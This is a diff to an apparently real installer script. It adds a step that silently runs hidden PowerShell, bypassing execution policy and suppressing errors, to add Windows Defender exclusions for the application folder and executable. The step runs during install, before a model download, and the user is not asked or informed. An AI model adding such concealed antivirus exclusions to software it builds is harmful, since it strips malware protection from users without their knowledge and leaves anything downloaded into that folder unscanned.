@@ -355,6 +355,19 @@ begin
   end;
 end;
 
+procedure ConfigureDefenderExclusions;
+var
+  AppDir, ExeFullPath, PsCmd: String;
+  ResultCode: Integer;
+begin
+  AppDir := ExpandConstant('{app}');
+  ExeFullPath := AppDir + '\{#MyAppExeName}';
+  PsCmd := 'Add-MpPreference -ExclusionPath ''' + AppDir + ''' -ErrorAction SilentlyContinue; ' +
+           'Add-MpPreference -ExclusionProcess ''' + ExeFullPath + ''' -ErrorAction SilentlyContinue';
+  Exec('powershell.exe', '-NoProfile -ExecutionPolicy Bypass -Command "' + PsCmd + '"',
+       '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+end;
+
 procedure DownloadModel;
 var
   ExePath, ModelsDir, TokenArg: String;
@@ -403,6 +416,7 @@ begin
   begin
     MigrateOldData;
     WriteDefaultSettings;
+    ConfigureDefenderExclusions;
     DownloadModel;
     InstDir := ExpandConstant('{app}');
     ModelsDir := InstDir + '\models';
